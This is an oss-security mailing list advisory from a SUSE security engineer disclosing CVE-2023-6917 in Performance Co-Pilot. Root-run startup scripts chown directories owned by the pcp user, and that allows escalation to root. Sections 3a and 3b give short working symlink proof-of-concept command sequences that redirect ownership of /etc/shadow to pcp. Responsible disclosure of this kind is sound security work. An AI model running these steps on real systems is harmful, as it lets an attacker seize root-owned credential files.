Received: (qmail 12257 invoked by uid 550); 28 Feb 2024 11:29:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 12221 invoked from network); 28 Feb 2024 11:29:53 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1709119999; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=jnuZp35v1Z+0gHZTiOc3teC6z85HOUL2GlaZGkYge+c=;
	b=FbwfUuqPBjUxpN6C/drRRYH24pOY6eLCBCWx7DPkF+8h0BtLNkcXomc9tgI+6/qxHzgJQv
	Ioz9ZxcFi4sLqTIFEK/hSvAMDfSqkd4+VAldByO83i0yh5cOcknwDUBqDeYQ7ptGZoYcem
	NrazwIjKiRqu1Pc2ouVgs9HdQtYGlKk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1709119999;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=jnuZp35v1Z+0gHZTiOc3teC6z85HOUL2GlaZGkYge+c=;
	b=cXqLx5xNGfW1QjPDXRukajn9vC6xy2Y8KRSU6LaNQmsFphSFrYU1cYk1UA9y08QuxkMt3A
	sTAJYdcTJaWQikDQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1709119999; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=jnuZp35v1Z+0gHZTiOc3teC6z85HOUL2GlaZGkYge+c=;
	b=FbwfUuqPBjUxpN6C/drRRYH24pOY6eLCBCWx7DPkF+8h0BtLNkcXomc9tgI+6/qxHzgJQv
	Ioz9ZxcFi4sLqTIFEK/hSvAMDfSqkd4+VAldByO83i0yh5cOcknwDUBqDeYQ7ptGZoYcem
	NrazwIjKiRqu1Pc2ouVgs9HdQtYGlKk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1709119999;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=jnuZp35v1Z+0gHZTiOc3teC6z85HOUL2GlaZGkYge+c=;
	b=cXqLx5xNGfW1QjPDXRukajn9vC6xy2Y8KRSU6LaNQmsFphSFrYU1cYk1UA9y08QuxkMt3A
	sTAJYdcTJaWQikDQ==
Date: Wed, 28 Feb 2024 12:33:19 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Zd8Z_xIfotejF-H-@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="EfqclWFFrUj56ZXt"
Content-Disposition: inline
Authentication-Results: smtp-out1.suse.de;
	none
Subject: [oss-security] Performance Co-Pilot (pcp): Unsafe use of Directories in
 /var/lib/pcp and /var/log/pcp breaks pcp Service User Isolation
 (CVE-2023-6917)

--EfqclWFFrUj56ZXt
Content-Type: text/plain; protected-headers=v1; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
Date: Wed, 28 Feb 2024 12:33:19 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: Performance Co-Pilot (pcp): Unsafe use of Directories in
 /var/lib/pcp and /var/log/pcp breaks pcp Service User Isolation
 (CVE-2023-6917)

Hello list,

this report is about a local pcp to root user exploit in the PCP
performance analysis toolkit. You can also find a rendered HTML version
of this report on our blog [1].

1) Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Performance Co-Pilot (pcp) [2] is a performance analysis toolkit
that allows to gather and evaluate data on a local system and also share th=
is
data over the network in a distributed manner.

During routine reviews we noticed issues in pcp on Linux with directory
permissions that allow to locally escalate privileges from the _pcp_ service
user to _root_.

These findings are based on the 5.3.7 version release of pcp. CVE-2023-6917
has been assigned for this class of issues in pcp.

2) Service User And Directory Permissions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The systemd services shipped with pcp run with mixed privileges. Some use o=
nly
limited _pcp_ user/group privileges, like "pmie_check.service". Others like
"pmcd.service" run with full root privileges. The `pmcd` daemon implements =
the
networking logic of pcp. It drops privileges from _root_ to _pcp_ during
startup.

The different pcp programs use a shared directory structure:

- /var/lib/pcp/tmp owned by `pcp:pcp` mode `0775`
- /var/log/pcp     owned by `pcp:pcp` mode `0775`

When privileged processes running as _root_ access files in directories or
directory trees controlled by unprivileged users, then easily security issu=
es
can result from this. For the directories listed above, we quickly found the
two exploitable issues that are described in the following sections.

3a) Startup Script for `pmcd` runs chown for `$PCP_TMP_DIR/pmlogger`
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The "pmcd.service" runs with root privileges and executes the bash script
"/usr/libexec/pcp/lib/pmcd" (named "rc_pmcd" in the Git source repository).
Within this script the following code [5] runs as part of the
start routine, found in function `_reboot_setup()`:

     if [ ! -d "$PCP_TMP_DIR/pmlogger" ]
     then
         mkdir -p -m 775 "$PCP_TMP_DIR/pmlogger"
         chown $PCP_USER:$PCP_GROUP "$PCP_TMP_DIR/pmlogger"
         if which restorecon >/dev/null 2>&1
         then
             restorecon -r "$PCP_TMP_DIR"
         fi
     else

`$PCP_TMP_DIR` in this context refers to "/var/lib/pcp/tmp", owned by `pcp:=
pcp`
mode `0775`. Since the shell code above does not exit on errors, a compromi=
sed pcp
user doesn't even have to win a race condition to perform a symlink attack.
The following exploit works:

    # simulate a compromised pcp user
    root # sudo -u pcp -g pcp bash
    pcp  $ cd /var/lib/pcp/tmp
    pcp  $ rm -r pmlogger
    pcp  $ ln -s /etc/shadow pmlogger
    pcp  $ exit
    root # systemctl start pcmd.service
    root # ls -l /etc/shadow
    -rw-r----- 1 pcp pcp 1.2K Dec  7 15:47 /etc/shadow

3b) Startup Script for `pmproxy` runs chown in `$RUN_DIR`
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D

The "pmproxy.service" runs with root privileges and executes the bash script
"/usr/libexec/pcp/lib/pmproxy" (named `rc_pmproxy` in the Git source
repository). Within this script the following code [6] runs as
part of the start (and other) routines:

    # create directory which will serve as cwd
    if [ ! -d "$RUNDIR" ]
    then
        mkdir -p -m 775 "$RUNDIR"
        chown $PCP_USER:$PCP_GROUP "$RUNDIR"
    fi

`$RUN_DIR` in this context refers to "/var/log/pcp/pmproxy". "/var/log/pcp"=
 is
owned by `pcp:pcp` mode `0775`. Similar to the exploit described in section
3a), no race condition has to be won to exploit this:

    # simulate a compromised pcp user
    root # sudo -u pcp -g pcp bash
    pcp  $ cd /var/log/pcp
    pcp  $ rm -rf pmproxy
    pcp  $ ln -s /etc/shadow pmproxy
    pcp  $ exit
    root # systemctl start pmproxy.service
    root # ls -l /etc/shadow
    -rw-r----- 1 pcp pcp 1.2K Dec  7 15:47 /etc/shadow

4) Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We only picked two of the more obvious security issues that result from _ro=
ot_
processes operating on these pcp owned directories. There are likely more
issues of the same class lingering in the pcp scripts that run as _root_. G=
iven
this, the user separation of _pcp_ can be considered nonexistent in its
current form, and the _pcp_ user should be treated equal to _root_.

The _pcp_ service user is also used for the network facing `pmcd` component,
thus these issues strongly impact defense in depth for pcp, for the scenario
when an attacker finds a way to exploit the network daemon.

5) Bugfix
=3D=3D=3D=3D=3D=3D=3D=3D=3D

Upstream performed a wider redesign of the privilege separation handling in
pcp components. The pull request [3] corresponding to this contains a
large number of commits. It is difficult to isolate any simple patches
from that.

In our Bugzilla bug [4] that tracks this issue, I attempted to identify
the subset of commits relevant to this issue, to help with backporting.

6) Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2023-12-13: I reported the findings to pcp-maintainers@groups.io offering c=
oordinated disclosure.
2023-12-14: The Red Hat Security Team was added to the discussion.
2023-12-15: After some initial disagreement whether this qualifies as an ac=
tual security issue, an agreement was found that it is a change of security=
 scope and deserves a CVE assignment.
2023-12-15: An upstream author suggested mid of February as a publication d=
ate, for which time a release for pcp had been planned anyway.
2023-12-18: Red Hat Security assigned CVE-2023-6917 to track the issue(s).
2024-01-01: Upstream discussed some initial changes to address the issue(s)=
 in the mail thread and I tried to give some feedback about them.
2024-02-20: Communication about the publication process died down, and I le=
arned from our packager that the Pull Request [3] containing the fixes had =
already been public for some time. It seems no clear embargo had been estab=
lished for the coordinated release, there had been contradicting statements.
2024-02-27: After verifying with the upstream authors that publication is o=
kay I finalized my report and published all information.

7) References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://security.opensuse.org/2024/02/27/pcp-user-to-root-exploit.html
[2]: https://pcp.io
[3]: https://github.com/performancecopilot/pcp/pull/1873
[4]: https://bugzilla.suse.com/show_bug.cgi?id=3D1217826#c24
[5]: https://github.com/performancecopilot/pcp/blob/5.3.7/src/pmcd/rc_pmcd#=
L134
[6]: https://github.com/performancecopilot/pcp/blob/5.3.7/src/pmproxy/rc_pm=
proxy#L264

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

--EfqclWFFrUj56ZXt
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmXfGf8ACgkQFMQFyXGS
NVOBWRAAxfiByILWHAjgwk1X7QXMuFut2EsVRBOOfSdLFXiUZGx7oi+AWyZXr4Ym
0vfvOpBNC3dnj7ZV8iO26K+CxgrshpZSRyk+5Q6F/QoYh+xRAwIqjGAHG6qKoY93
Y4x53VNd8dgTw4XbitrEwHBwII5Dgcxui33ZxldVHahBZPHq02I+nzSMaUR1QmPW
RboSdhPDwSqYQ6p39bjhu7hDobxy9VhAD/1KdiAlhTlBm+amzzE0iklxBzGF+0Nw
k0wl/0h5l6ubZw1Fs9FqkYQi6koLdejAMaXEk8t5S70VEPSaEbLkvKTxvY3/IdSC
9TsoiYM4HcVQw3aRxcd1GyRdPtUOJ+rcflhS4n14zpWXyYxMUM/jHToeHjP7IwVy
A49DGkzgeLf3oN63Hi2IIKrI1rwiKBpCXteU3V0G+MASHWKznXsobD0/VZuNkRGq
0pubQoM9Un3JEkHmkpDkqkvtq0ginWeOjOuC4fgWpKdZTfIAVdR1A+KqHHcYb6iH
UxKWrynSSoyfXCZazKqSTuPn14jbc5miGzdCL42+M8lNO/MaokTAqByEjBDvG+fC
4KtCddjCc7+CoJAJtgaGaIr95xHR/ca4bdcpDRsKxgrZswqIEKHuZKRu9fwvgcga
Ca8Sze0+RseRJLVej4pbaTAqQU1CSwKk5fUr7U2lmpNzTS7tga4=
=uAYr
-----END PGP SIGNATURE-----

--EfqclWFFrUj56ZXt--
